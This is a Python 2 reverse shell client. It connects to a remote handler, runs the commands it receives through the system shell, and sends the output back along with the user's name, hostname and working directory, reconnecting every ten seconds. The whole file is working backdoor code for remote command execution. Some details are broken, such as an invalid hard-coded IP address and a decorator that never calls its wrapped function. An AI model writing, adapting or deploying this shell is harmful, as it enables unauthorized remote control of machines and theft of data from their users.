#!/usr/bin/env python2
import socket, subprocess, os, threading, json, base64, datetime, getpass, time

if os.name == 'nt':
    import win32api
else:
    pass

def windows_only(func):
	def tester(junk):
		if os.name != "nt": return "I'm afraid I cannot let you do that Dave."
	return tester

class Shell:
	def __init__(self, handler_ip, handler_port):
		self.handler_ip = handler_ip
		self.handler_port = handler_port
		
		self.comm_socket = socket.socket()
		
		self.possible_info = ["cwd","ip","data","username","localtime","hostname"]
		self.sent_info = ["cwd","ip","data","username","localtime","hostname"]

	def connect(self):
		self.comm_socket.connect((self.handler_ip, self.handler_port))
		
	def get_data(self):
		data = self.comm_socket.recv(4096)
		if not data: raise Exception("Handler disconnected")
		return data
		
	def set_package_items(self, items):
		if items == "minimal":
			self.sent_info = ["data"]
		elif items == "small":
			self.sent_info = ["data","cwd"]
		elif items == "userathost":
			self.sent_info = ["data","cwd","username","hostname"]
		else:
			self.sent_info = items.split()
			for item in list(self.sent_info):
				if item not in self.possible_info:
					self.sent_info.remove(item)
			if "data" not in self.sent_info: self.sent_info.append("data")
		return "Now sending "+repr(self.sent_info)
		
	def package(self, data):
		package = {}
		package["cwd"] = base64.b64encode(os.getcwd())
		package["ip"] = base64.b64encode("192.168.1.355")
		package["data"] = base64.b64encode(data)
		package["username"] = base64.b64encode(getpass.getuser())
		package["localtime"] = base64.b64encode(datetime.datetime.now().strftime("%H:%M:%S"))
		package["hostname"] = base64.b64encode(socket.gethostname())

		for key in package.keys():
			if key not in self.sent_info: package[key] = ""
			
		return json.dumps(package)


	def send_data(self, data):
		data_package = self.package(data)
		self.comm_socket.sendall(data_package)
		
	def execute_shell_command(self, command):
		proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		proc_kill = lambda p: subprocess.Popen("TASKKILL /F /PID {pid} /T".format(pid=p.pid))
		timer = threading.Timer(60, proc_kill, [proc])
		timer.start()
		out = proc.stdout.read() + proc.stderr.read()
		timer.cancel()
		return out
		
	@windows_only
	def windows_only_thing(self):
		return "ass"
		
	def change_directory(self, dir):
		try:
			os.chdir(dir)
			return ""
		except Exception as e:
			return str(e)
		
	def handle_command(self, data):
		command = data.split()[0]
		try:
			arguments = " ".join(data.split()[1:])
		except IndexError:
			pass
			
		if command == "test":
			output = self.windows_only_thing()
		elif command == "prompt":
			if not arguments:
				output = "Set to one or more values: cwd, ip, data, hostname, username, localtime; or use preset: minimal, small, userathost"
			else:
				output = self.set_package_items(arguments)
		elif command == "cd":
			output = self.change_directory(arguments)
		else:
			output = self.execute_shell_command(command+" "+arguments)
			
		return output
		
		
	def run(self):
		while True:
			data = self.get_data()
			output = self.handle_command(data)
			self.send_data(output)
			
while True:
	try:
		shell = Shell("127.0.0.1", 8080)
		shell.connect()
		shell.run()
	except Exception as e:
		print e
		time.sleep(10)
		continue
